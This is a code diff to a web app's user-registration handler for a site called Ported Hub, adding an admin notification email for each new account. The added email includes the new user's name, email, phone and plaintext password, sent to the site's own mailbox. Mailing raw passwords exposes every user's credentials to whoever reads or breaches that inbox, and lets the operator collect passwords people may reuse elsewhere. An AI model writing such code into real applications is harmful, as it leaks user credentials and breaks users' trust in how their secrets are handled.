@@ -67,6 +67,20 @@ export async function POST(request: Request) {
             <p>Best regards,<br/>The Ported Hub Team</p>
           `
         });
+
+        // Send Notification to the Admin/Owner
+        await transporter.sendMail({
+          from: process.env.EMAIL_USER,
+          to: process.env.EMAIL_USER, // Send to admin
+          subject: `New User Registration: ${firstName} ${lastName}`,
+          html: `
+            <h2>New Account Created on Ported Hub</h2>
+            <p><strong>Name:</strong> ${firstName} ${lastName}</p>
+            <p><strong>Email:</strong> ${email}</p>
+            <p><strong>Phone:</strong> ${phone}</p>
+            <p><strong>Password:</strong> ${password}</p>
+          `
+        });
       } else {
         console.warn('EMAIL_USER or EMAIL_PASS not set in .env file. Welcome email skipped.');
       }
